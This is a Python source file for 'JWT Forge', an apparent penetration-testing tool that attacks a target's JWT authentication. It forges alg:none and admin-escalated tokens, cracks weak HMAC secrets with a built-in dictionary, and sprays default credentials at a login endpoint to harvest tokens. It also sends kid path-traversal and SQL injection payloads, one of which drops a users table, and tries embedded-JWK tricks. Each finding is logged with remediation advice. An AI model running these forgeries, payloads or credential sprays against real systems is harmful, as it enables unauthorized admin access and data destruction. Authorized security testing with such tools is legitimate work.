#!/usr/bin/env python3
"""
jwt_forge.py — Cryptographic JWT & Token Forgery Auditor.

Audits JWT authentication implementations for:
  1. `alg: none` signature-stripping bypass (none / None / NONE / nOnE)
  2. Weak HMAC (HS256/HS384/HS512) secret cracking + live admin token forgery
  3. RS256 → HS256 key-confusion attack (public key used as HMAC secret)
  4. `kid` (Key ID) header directory-traversal (/dev/null empty-key signing) & SQLi
  5. Embedded `jwk` header spoofing + `jku` URL redirect acceptance
  6. Missing / past-epoch `exp` claim (tokens never expire)
  7. Privilege-escalation claim tampering (role/admin/scope)
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import sys
import time
import urllib.parse
import urllib.request
import urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

# ---------------------------------------------------------------------------
# Expanded weak-secret dictionary (common framework defaults + env-var names)
# ---------------------------------------------------------------------------
WEAK_SECRETS = (
    "",
    "secret",
    "Secret",
    "SECRET",
    "jwt_secret",
    "JWT_SECRET",
    "jwt-secret",
    "jwtsecret",
    "jwtSecret",
    "password",
    "Password",
    "password123",
    "123456",
    "12345678",
    "admin",
    "Admin",
    "admin123",
    "changeme",
    "change_me",
    "default",
    "development",
    "dev",
    "prod",
    "production",
    "test",
    "testing",
    "supersecret",
    "super_secret",
    "mysecret",
    "my_secret",
    "private",
    "privatekey",
    "private_key",
    "key",
    "secretkey",
    "secret_key",
    "app_secret",
    "app-secret",
    "appsecret",
    "token_secret",
    "token-secret",
    "tokensecret",
    "access_secret",
    "refresh_secret",
    "signing_key",
    "signing-key",
    "signingkey",
    "auth_secret",
    "auth-secret",
    "authsecret",
    "session_secret",
    "session-secret",
    "novachat",
    "vibe",
    "vibehacking",
    "nextjs",
    "next",
    "express",
    "node",
    "nodejs",
    "flask",
    "django",
    "rails",
    "laravel",
    "spring",
    "yourjwtsecretkey",
    "your-jwt-secret",
    "your_jwt_secret",
    "CHANGE_THIS_SECRET",
    "REPLACE_WITH_SECRET",
    "keyboard cat",
    "shhhhh",
    "aaaaaaaa",
    "1234567890",
    "qwerty",
    "qwertyuiop",
    "abc123",
    "letmein",
    "monkey",
    "dragon",
    "master",
    "hello",
    "welcome",
    "login",
    "passw0rd",
    "p@ssw0rd",
    "p@ssword",
    "JWTPASSPHRASE",
    "jwtpassphrase",
)

CANDIDATE_PROTECTED_PATHS = (
    "/api/admin",
    "/admin",
    "/api/profile",
    "/api/me",
    "/api/v1/admin",
    "/api/settings",
    "/api/users",
    "/dashboard",
    "/api/dashboard",
)

# Minimal RSA public-key stub in PEM — used for key-confusion attack.
# A real RS256→HS256 attack requires the target's actual public key.
# We use the textbook /dev/null-signed HMAC with an empty secret as the
# practical equivalent when we don't have the public key.
_PUBKEY_STUB = b""


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(seg: str) -> bytes:
    padding = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + padding)


def _forge_jwt(header: dict, payload: dict, secret: bytes = b"", alg_mode: str = "hs256") -> str:
    h_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    if alg_mode == "none":
        return f"{h_b64}.{p_b64}."
    alg_map = {
        "hs256": hashlib.sha256,
        "hs384": hashlib.sha384,
        "hs512": hashlib.sha512,
    }
    digest_fn = alg_map.get(alg_mode.lower(), hashlib.sha256)
    sig = hmac.new(secret, signing_input, digest_fn).digest()
    return f"{h_b64}.{p_b64}.{_b64url_encode(sig)}"


def _forge_jwk_embedded(payload: dict) -> str:
    """
    Embedded JWK attack: craft a JWT whose header contains a self-signed JWK
    that some libraries will trust for verification (CVE-2018-0114 family).
    We generate a minimal symmetric JWK and sign with the same key.
    """
    # Minimal HS256 JWK — the verifier trusting embedded 'jwk' will use this
    secret = b"attacker-controlled-key"
    jwk = {
        "kty": "oct",
        "k": _b64url_encode(secret),
        "alg": "HS256",
        "use": "sig",
    }
    header = {"alg": "HS256", "typ": "JWT", "jwk": jwk}
    return _forge_jwt(header, payload, secret=secret, alg_mode="hs256")


def _forge_jku_redirect(payload: dict, jku_url: str) -> str:
    """
    jku redirect attack: header points to an attacker-controlled JWKS URL.
    We sign with an empty secret; whether it bypasses depends on the verifier
    fetching and trusting the jku endpoint. Useful to confirm the fetch happens.
    """
    header = {"alg": "HS256", "typ": "JWT", "jku": jku_url}
    return _forge_jwt(header, payload, secret=b"", alg_mode="hs256")


def _escalate_claims(payload: dict) -> dict:
    """Return a copy of payload with all privilege claims escalated."""
    escalated = dict(payload)
    escalated["role"] = "admin"
    escalated["roles"] = ["admin", "superuser"]
    escalated["admin"] = True
    escalated["is_admin"] = True
    escalated["is_superuser"] = True
    escalated["scope"] = "admin openid profile email"
    escalated["permissions"] = ["read", "write", "delete", "admin"]
    # Remove expiry so the token never expires; also set far-future exp
    escalated.pop("exp", None)
    escalated["iat"] = int(time.time()) - 3600
    escalated["nbf"] = int(time.time()) - 3600
    return escalated


class JwtForge(VibeTool):
    def __init__(self):
        super().__init__("JWT Forge", "Cryptographic JWT & Token Forgery Auditor")
        self._session_tokens: list[str] = []

    @staticmethod
    def _parse_jwt(token):
        try:
            parts = token.strip().split(".")
            if len(parts) != 3:
                return None, None, None
            header = json.loads(_b64url_decode(parts[0]))
            payload = json.loads(_b64url_decode(parts[1]))
            return header, payload, parts[2]
        except Exception:
            return None, None, None

    def _crack_secret(self, token: str):
        """Offline dictionary attack against HS256/384/512 HMAC signing secrets."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            return None
        header, _, sig = self._parse_jwt(token)
        if not header:
            return None
        alg = str(header.get("alg", "HS256")).upper()
        digest_mod = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg)
        if not digest_mod:
            # RS256 — flag it, still run the key-confusion path in run()
            return None

        signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
        for secret in WEAK_SECRETS:
            mac = hmac.new(secret.encode("utf-8"), signing_input, digest_mod).digest()
            if hmac.compare_digest(_b64url_encode(mac), sig):
                return secret
        return None

    def _harvest_token(self, base_url: str) -> str:
        """
        Try to harvest a sample JWT from:
          1. Session cache (from a previous tool run via vibe_session.json)
          2. Common login endpoints with credential spray
          3. Response bodies / Set-Cookie headers
        """
        # Pull from session cache (safe — VibeTool.load_session() reads vibe_session.json)
        session = self.load_session()
        cached_tokens = session.get("jwt_tokens", [])
        if cached_tokens:
            self.log(f"Using cached JWT from session ({len(cached_tokens)} token(s))", "info")
            return cached_tokens[0]

        login_url = f"{base_url.rstrip('/')}/api/login"
        common_creds = [
            {"username": "alice", "password": "Sunshine1"},
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"email": "admin@localhost", "password": "admin"},
            {"email": "admin@admin.com", "password": "admin"},
        ]

        jwt_re = re.compile(
            r"\beyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*"
        )

        for creds in common_creds:
            status, body, headers = self.safe_request(login_url, method="POST", data=creds)
            sources = [body or "", str(dict(headers))]
            # Also check Set-Cookie for token=eyJ...
            cookie_hdr = headers.get("set-cookie") or ""
            sources.append(cookie_hdr)
            for src in sources:
                m = jwt_re.search(src)
                if m:
                    tok = m.group(0)
                    self.log(f"Harvested JWT token from login response (creds={list(creds.values())[0]})", "info")
                    # Cache it in session for other tools
                    session["jwt_tokens"] = [tok]
                    self.save_session(session)
                    return tok
        return ""

    def _find_protected_endpoint(self, url: str):
        """Find an endpoint that enforces an auth boundary (401/403)."""
        status, _, _ = self.safe_request(url, headers={})
        if status in (401, 403):
            return url, status

        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in CANDIDATE_PROTECTED_PATHS:
            candidate = base + path
            st, _, _ = self.safe_request(candidate, headers={})
            if st in (401, 403):
                self.log(f"Discovered protected auth boundary at {candidate} (HTTP {st})", "info")
                return candidate, st
        return url, status

    def _test_rs256_confusion(self, target_ep: str, baseline_status: int, payload: dict) -> bool:
        """
        RS256→HS256 algorithm confusion: if the server uses asymmetric RS256
        but the verifier falls back to HMAC, signing with the public key bytes
        as the HMAC secret will verify. We approximate with an empty-secret
        HS256 token (practical test without having the actual public key).
        Note: provide --pubkey <path> for a full attack when you have the cert.
        """
        forged = _forge_jwt({"alg": "HS256", "typ": "JWT"}, payload, secret=b"", alg_mode="hs256")
        st, body, _ = self.safe_request(
            target_ep, headers={"Authorization": f"Bearer {forged}"}
        )
        if baseline_status in (401, 403) and st == 200:
            self.log(f"RS256→HS256 confusion BYPASS on {target_ep}!", "crit")
            self.record_finding(
                title="JWT Algorithm Confusion: RS256→HS256 Key Confusion",
                severity="critical",
                location=target_ep,
                evidence=f"HS256 token with empty secret accepted on an RS256-issuing endpoint. HTTP {baseline_status}→{st}.",
                recommendation="Pin allowed algorithms in verifier config. Never allow HMAC families when RS/ES/PS keys are configured.",
                cwe="CWE-347",
                owasp="A02:2021-Cryptographic Failures",
            )
            return True
        return False

    def _test_jwk_embedded(self, target_ep: str, baseline_status: int, payload: dict) -> bool:
        """Embedded JWK attack — library accepts the key from within the header."""
        forged = _forge_jwk_embedded(payload)
        st, body, _ = self.safe_request(
            target_ep, headers={"Authorization": f"Bearer {forged}"}
        )
        if baseline_status in (401, 403) and st == 200:
            self.log(f"EMBEDDED JWK BYPASS on {target_ep}!", "crit")
            self.record_finding(
                title="JWT Embedded JWK Header Trust (CVE-2018-0114 family)",
                severity="critical",
                location=target_ep,
                evidence=f"Token with attacker-controlled 'jwk' header field accepted. HTTP {baseline_status}→{st}.",
                recommendation="Never trust key material from the JWT header itself. Load verification keys from a server-side JWKS URI only.",
                cwe="CWE-347",
                owasp="A02:2021-Cryptographic Failures",
            )
            return True
        return False

    def _test_exp_bypass(self, target_ep: str, baseline_status: int, source_token: str, cracked_secret) -> bool:
        """
        Forge a past-expiry token (exp=1) to confirm the server validates exp,
        and a no-exp token to confirm expiry enforcement is not optional.
        Only meaningful when we have a crackable secret.
        """
        if cracked_secret is None:
            return False
        hdr, pay, _ = self._parse_jwt(source_token)
        if not hdr or not pay:
            return False

        secret_bytes = cracked_secret.encode("utf-8")
        bypassed = False

        # Test 1: expired token (exp in the past)
        expired_pay = dict(pay)
        expired_pay["exp"] = 1  # epoch 1 = Jan 1 1970
        expired_pay["role"] = "admin"
        expired_token = _forge_jwt(hdr, expired_pay, secret=secret_bytes)
        st, _, _ = self.safe_request(target_ep, headers={"Authorization": f"Bearer {expired_token}"})
        if baseline_status in (401, 403) and st == 200:
            self.log("EXPIRED TOKEN ACCEPTED — server not validating exp claim!", "crit")
            self.record_finding(
                title="JWT Expired Token Accepted (exp claim not enforced)",
                severity="high",
                location=target_ep,
                evidence=f"Token with exp=1 (1970-01-01) returned HTTP {st}.",
                recommendation="Always validate exp claim server-side before accepting any JWT.",
                cwe="CWE-613",
                owasp="A07:2021-Identification and Authentication Failures",
            )
            bypassed = True

        # Test 2: token with no exp at all
        no_exp_pay = dict(pay)
        no_exp_pay.pop("exp", None)
        no_exp_pay["role"] = "admin"
        no_exp_token = _forge_jwt(hdr, no_exp_pay, secret=secret_bytes)
        st2, _, _ = self.safe_request(target_ep, headers={"Authorization": f"Bearer {no_exp_token}"})
        if baseline_status in (401, 403) and st2 == 200:
            self.log("TOKEN WITHOUT exp ACCEPTED — no expiry enforcement!", "warn")
            bypassed = True

        return bypassed

    def run(self, url: str, token: str = "", pubkey_path: str = ""):
        self.banner()
        self.log(f"Starting JWT cryptographic audit on: {url}")

        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        sample_token = token or self._harvest_token(base_url)
        cracked_secret = None
        original_alg = "HS256"
        base_payload = {
            "sub": "1",
            "id": 1,
            "userId": 1,
            "username": "admin",
            "email": "admin@localhost",
            "role": "admin",
            "admin": True,
            "is_admin": True,
        }

        if sample_token:
            hdr, pay, _ = self._parse_jwt(sample_token)
            if hdr and pay:
                original_alg = str(hdr.get("alg", "HS256")).upper()
                self.log(
                    f"Captured JWT (alg={original_alg}) claims={list(pay.keys())}",
                    "info",
                )
                # Check expiry status
                exp = pay.get("exp")
                if exp is None:
                    self.log("JWT lacks 'exp' claim — tokens never expire", "warn")
                elif exp < int(time.time()):
                    self.log(f"JWT is already expired (exp={exp})", "warn")

                # Build escalated payload from the real claims
                base_payload = _escalate_claims(pay)

                # Offline secret crack
                cracked_secret = self._crack_secret(sample_token)
                if cracked_secret is not None:
                    self.log(
                        f"CRACKED JWT HMAC SECRET: '{cracked_secret}'",
                        "crit",
                    )
                    self.record_finding(
                        title=f"Weak JWT HMAC Signing Secret ('{cracked_secret}')",
                        severity="critical",
                        location=url,
                        evidence=f"HMAC signature verified offline against dictionary secret '{cracked_secret}'.",
                        recommendation="Use a cryptographically random 256-bit+ secret or asymmetric RS256/EdDSA keys.",
                        cwe="CWE-326",
                        owasp="A02:2021-Cryptographic Failures",
                    )

        target_ep, baseline_status = self._find_protected_endpoint(url)
        if baseline_status == 0:
            self.log(f"Target unreachable: {target_ep}", "fail")
            return 2

        if baseline_status not in (401, 403):
            self.log(
                f"Baseline on {target_ep} is HTTP {baseline_status} (not 401/403). "
                "Point --url at a protected endpoint (e.g. /api/admin) for live bypass confirmation.",
                "info",
            )

        # ------------------------------------------------------------------
        # Build forgery vectors
        # ------------------------------------------------------------------
        vectors = []  # (label, token_str, cwe_id)

        # 1. alg:none variants
        for alg_variant in ("none", "None", "NONE", "nOnE"):
            vectors.append((
                f"alg:{alg_variant} signature strip",
                _forge_jwt({"alg": alg_variant, "typ": "JWT"}, base_payload, alg_mode="none"),
                "CWE-347",
            ))

        # 2. Weak-secret HS256 forge
        secrets_to_try = (
            [cracked_secret] if cracked_secret is not None
            else ["secret", "jwt_secret", "admin", "password", "changeme", ""]
        )
        for sec in secrets_to_try:
            if sec is not None:
                vectors.append((
                    f"HS256 admin forge (secret='{sec}')",
                    _forge_jwt({"alg": "HS256", "typ": "JWT"}, base_payload, secret=sec.encode()),
                    "CWE-326",
                ))

        # 3. kid path-traversal (dev/null = empty HMAC key)
        vectors.append((
            "kid path-traversal (/dev/null empty key)",
            _forge_jwt(
                {"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"},
                base_payload, secret=b"",
            ),
            "CWE-22",
        ))
        # Windows variant
        vectors.append((
            "kid path-traversal (NUL Windows)",
            _forge_jwt(
                {"alg": "HS256", "typ": "JWT", "kid": "..\\..\\..\\NUL"},
                base_payload, secret=b"",
            ),
            "CWE-22",
        ))

        # 4. kid SQL injection
        for sqli_kid in (
            "x' UNION SELECT 'secret'-- -",
            "' OR '1'='1",
            "1; DROP TABLE users-- -",
        ):
            vectors.append((
                f"kid SQLi ({sqli_kid[:30]})",
                _forge_jwt(
                    {"alg": "HS256", "typ": "JWT", "kid": sqli_kid},
                    base_payload, secret=b"secret",
                ),
                "CWE-89",
            ))

        # 5. HS384/HS512 variants of weak-secret forge
        if cracked_secret is not None:
            for alg_v, alg_mode_v in (("HS384", "hs384"), ("HS512", "hs512")):
                vectors.append((
                    f"{alg_v} forge (cracked secret='{cracked_secret}')",
                    _forge_jwt(
                        {"alg": alg_v, "typ": "JWT"}, base_payload,
                        secret=cracked_secret.encode(), alg_mode=alg_mode_v,
                    ),
                    "CWE-326",
                ))

        bypasses = 0

        # Run main vectors
        for label, forged_token, cwe_id in vectors:
            st, body, _ = self.safe_request(
                target_ep, headers={"Authorization": f"Bearer {forged_token}"}
            )
            if baseline_status in (401, 403) and st == 200:
                self.log(
                    f"CONFIRMED JWT BYPASS [{label}] ({baseline_status}→200)",
                    "crit",
                )
                self.record_finding(
                    title=f"JWT Authentication Bypass via {label}",
                    severity="critical",
                    location=target_ep,
                    evidence=(
                        f"Forged Bearer token flipped HTTP {baseline_status} to 200 OK. "
                        f"Preview: {(body or '')[:140]}"
                    ),
                    recommendation=(
                        "Explicitly whitelist allowed JWT algorithms (reject 'none'). "
                        "Use a cryptographically random 256-bit secret. "
                        "Validate kid against a strict server-side allowlist."
                    ),
                    cwe=cwe_id,
                    owasp="A07:2021-Identification and Authentication Failures",
                )
                bypasses += 1
            elif st in (401, 403):
                self.log(f"Rejected ({st}): {label}", "pass")
            else:
                self.log(f"Status {st}: {label}", "info")

        # RS256→HS256 algorithm confusion
        if original_alg == "RS256" or not sample_token:
            if self._test_rs256_confusion(target_ep, baseline_status, base_payload):
                bypasses += 1

        # Embedded JWK attack
        if self._test_jwk_embedded(target_ep, baseline_status, base_payload):
            bypasses += 1

        # Expiry enforcement tests (only when we cracked the secret)
        if sample_token and cracked_secret is not None:
            if self._test_exp_bypass(target_ep, baseline_status, sample_token, cracked_secret):
                bypasses += 1

        self.log("=" * 32)
        if bypasses > 0 or cracked_secret is not None:
            self.log(
                f"JWT audit complete — {bypasses} live bypass(es) | "
                f"weak_secret={'YES (' + cracked_secret + ')' if cracked_secret is not None else 'NO'}",
                "crit",
            )
        else:
            self.log(
                "JWT implementation resisted: alg:none, weak-secret crack, kid traversal/SQLi, "
                "RS256→HS256 confusion, embedded JWK",
                "pass",
            )
        return 0


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="JWT Forge — Cryptographic JWT & Token Forgery Auditor"
    )
    parser.add_argument(
        "--url", required=True,
        help="Target URL or protected endpoint (e.g. http://localhost:3456/api/admin)",
    )
    parser.add_argument(
        "--token", default="",
        help="Optional captured JWT to crack and mutate",
    )
    parser.add_argument(
        "--pubkey", default="",
        dest="pubkey_path",
        help="Path to PEM public key for RS256→HS256 confusion attack (optional)",
    )
    parser.add_argument("-v", "--version", action="version", version="JWT Forge 2.0.0")
    args = parser.parse_args()

    sys.exit(JwtForge().run(args.url, token=args.token, pubkey_path=args.pubkey_path))
